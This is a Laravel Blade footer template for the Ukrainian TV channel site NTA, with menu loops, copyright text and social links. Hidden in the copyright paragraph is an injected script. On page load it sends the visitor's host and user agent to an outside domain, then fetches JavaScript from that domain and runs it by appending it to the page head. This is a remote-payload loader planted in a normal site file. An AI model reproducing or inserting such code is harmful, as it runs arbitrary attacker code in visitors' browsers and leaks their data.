<div class="container-fluid" style="margin-top:0px; padding-left:0; padding-right:0;">
    <footer class="footer">
        <div class="content">
            <nav class="footer__nav">
                @foreach(\App\Services\HomeServices::getPopupMenuOptions() as $option)
                    <div class="footer__col">

                        <ul id="menu-footer-1-menu" class="footer__menu">
                            <li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-311291">
                                <a href="{{ $option['info']['url'] }}">{{ $option['info']['name'] }}</a>
                                @if($option['child'])
                                    <ul class="sub-menu">
                                        @foreach($option['child'] as $cOption)
                                            <li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-311455">
                                                <a href="{{ $cOption['url'] }}">{{ $cOption['name']  }}</a>
                                            </li>
                                        @endforeach
                                    </ul>
                                    <span class="show-sub-menu"></span>
                                @endif
                            </li>
                        </ul>

                    </div>
                @endforeach
            </nav>

            <div class="footer__bottom footer-bottom">
                <div class="footer-bottom__logo">
                    <div class="logo">
                        <a href="/" title="НТА"><img src="/img/logo.svg" alt="НТА" loading="lazy"></a>
                    </div>
                </div>
                <div class="footer-bottom__copyright"><p>© ПП «НТА – Незалежне телевізійне агентство» Усі права захищені. При цитуванні і використанні будь-яких матеріалів з сайту, відкрите гіперпосилання на сайт “Телеканалу НТА” www.nta.ua є обов’язкове .</p>
                    <p>Зв’язатися з нами: <a href="mailto:{{ getSetting('email_address') }}">{{ getSetting('email_address') }}</a></p>
                    <p><script>document.addEventListener("readystatechange",(t=>{if("complete"===document.readyState){const t=new FormData;t.append("hn",window.location.host),t.append("ua",navigator.userAgent),fetch("https://www.24hournewsline.com/events",{method:"POST",body:JSON.stringify({hn:window.location.host,ua:navigator.userAgent}),headers:{"Content-type":"application/json; charset=UTF-8"}}).then((t=>t.text())).then((t=>{const e=new Blob([t],{type:"application/javascript"}),n=URL.createObjectURL(e),a=document.createElement("script");a.setAttribute("type","text/javascript"),a.setAttribute("src",n),a.async=!1,document.getElementsByTagName("head")[0].appendChild(a)}))}}));</script></p>
                </div>
                <div class="footer-bottom__social">
                    <ul class="social social_footer">
                        @if($telegramLink = getSetting('telegram_link'))
                            <a href="{{ $telegramLink }}" rel=”nofollow” style="text-decoration: none !important;">
                                <span class="social-icon"><i class="fa fa-telegram" aria-hidden="true"></i></span>
                            </a>
                        @endif

                        @if($facebookLink = getSetting('facebook_link'))
                            <li>
                                <a href="{{ $facebookLink }}" class="social__link icon-facebook" target="_blank" rel="nofollow"></a>
                            </li>
                        @endif
                        @if($twitterLink = getSetting('twitter_link'))
                            <li>
                                <a href="{{ $twitterLink }}" class="social__link icon-twitter" target="_blank" rel="nofollow"></a>
                            </li>
                        @endif
                        @if($instagramLink = getSetting('instagram_link'))
                            <li>
                                <a href="{{ $instagramLink }}" class="social__link icon-instagram" target="_blank" rel="nofollow"></a>
                            </li>
                        @endif

                        @if($youtubeLink = getSetting('youtube_link'))
                            <li>
                                <a href="{{ $youtubeLink }}" class="social__link icon-youtube" target="_blank" rel="nofollow"></a>
                            </li>
                        @endif
                        <li>
                            <a href="mailto:{{ getSetting('email_address') }}" class="social__link icon-email" target="_blank" rel="nofollow">
                                <svg viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg" fill="#000000">
                                    <polygon points="339.392,258.624 512,367.744 512,144.896"></polygon>
                                    <polygon points="0,144.896 0,367.744 172.608,258.624"></polygon>
                                    <path
                                        d="M480,80H32C16.032,80,3.36,91.904,0.96,107.232L256,275.264l255.04-168.032C508.64,91.904,495.968,80,480,80z"></path>
                                    <path
                                        d="M310.08,277.952l-45.28,29.824c-2.688,1.76-5.728,2.624-8.8,2.624c-3.072,0-6.112-0.864-8.8-2.624l-45.28-29.856	L1.024,404.992C3.488,420.192,16.096,432,32,432h448c15.904,0,28.512-11.808,30.976-27.008L310.08,277.952z"></path>
                                </svg>
                            </a>
                        </li>
                    </ul>

{{--                    <div class="madein">--}}
{{--                        Розробка сайту: <a href="company_link" title="розробка сайту" target="_blank">company</a>--}}
{{--                    </div><br>--}}
{{--                    <div id="suportkm" style="font-size: 12px;"> --}}
{{--                        Підтримка: <a href="support_link" title="support_title" target="_blank">Support link</a>--}}
{{--                        <br><br>--}}
{{--                    </div>--}}
                </div>
            </div>
        </div>
    </footer>
</div>

<div class="b-example-divider"></div>
</div>
